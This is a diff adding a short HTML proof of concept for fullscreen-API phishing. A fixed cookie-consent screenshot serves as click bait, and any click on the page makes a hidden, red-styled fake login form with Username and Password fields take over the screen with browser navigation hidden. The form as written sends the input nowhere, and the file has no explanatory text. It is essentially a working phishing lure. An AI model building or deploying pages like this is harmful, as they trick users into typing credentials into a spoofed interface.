@@ -1,0 +1,13 @@
+<style>
+  input {border: 0; outline: 1px solid white; margin: 1ch; padding: 1ch; color: white; background: rgba(16,16,16,0.7)}
+  input::placeholder {color: white}
+</style>
+<div style="overflow: hidden; height: 0;">
+  <div id="phish" style="background: #96151d; font-family: 'Univers-Basic-Regular',Arial,Helvetica,sans-serif; color: white; display: flex; align-items: center; justify-content: center; flex-direction: column">
+      <div><input placeholder=Username></div>
+      <div><input placeholder=Password></div>
+      <div><input type=submit value=Login></div>
+  </div>
+</div>
+<img src=https://www.cookiebot.com/media/1037/screen-shot-2017-12-20-at-091947.png style="height: 50%; position: fixed; right: 0; top: 0;">
+<script>window.onclick=()=>phish.requestFullscreen({navigationUI:"hide"})</script>
